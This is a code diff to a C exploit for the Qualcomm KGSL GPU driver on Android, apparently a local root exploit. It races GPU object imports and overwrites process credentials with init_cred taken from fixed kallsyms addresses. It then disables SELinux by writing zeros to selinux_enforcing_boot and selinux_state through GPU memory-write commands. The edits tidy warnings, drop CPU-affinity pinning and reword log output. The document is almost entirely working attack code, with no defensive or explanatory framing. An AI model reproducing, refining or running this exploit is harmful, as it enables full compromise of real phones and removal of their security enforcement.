@@ -5,7 +5,7 @@ static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static volatile int dc_civac_works = -1;
 
-static void sigill_handler(int sig) { dc_civac_works = 0; }
+static void sigill_handler(int sig) { (void)sig; dc_civac_works = 0; }
 
 static void try_dc_civac(void *addr) {
     if (dc_civac_works == 0) return;
@@ -99,6 +99,7 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
 }
 
 static void *race_thread(void *arg) {
+    (void)arg;
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
@@ -109,19 +110,14 @@ static void *race_thread(void *arg) {
 }
 
 int main(int argc, char **argv) {
+    (void)argc; (void)argv;
     setbuf(stdout, NULL);
-
-    // CPU affinity for stable race
-    cpu_set_t cpuset;
-    CPU_ZERO(&cpuset);
-    CPU_SET(0, &cpuset);
-    sched_setaffinity(0, sizeof(cpuset), &cpuset);
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    printf("[*] Phase 0: Using fixed init_cred address from kallsyms\n");
+    printf("[*] Phase 0: Using fixed init_cred from kallsyms\n");
     uint64_t init_cred_addr = FIXED_INIT_CRED;
     printf("  init_cred=0x%lX\n", init_cred_addr);
 
@@ -312,7 +308,7 @@ int main(int argc, char **argv) {
     printf("[+] Cred overwrite done\n");
 
     // SELinux を確実に permissive にする (二重の手法)
-    printf("[*] Phase 8: Disable SELinux\n");
+    printf("[*] Phase 8: Disable SELinux (zero selinux_enforcing_boot and selinux_state)\n");
 
     // 手法1: selinux_enforcing_boot を 0 に
     {
@@ -320,7 +316,7 @@ int main(int argc, char **argv) {
         int dw = 0;
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint64_t enforcing_boot_addr = FIXED_SELINUX_ENFORCING_BOOT;
+        uint64_t enforcing_boot_addr = FIXED_ENFORCING_BOOT;
         uint32_t al, ah;
         split64(enforcing_boot_addr, &al, &ah);
         cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
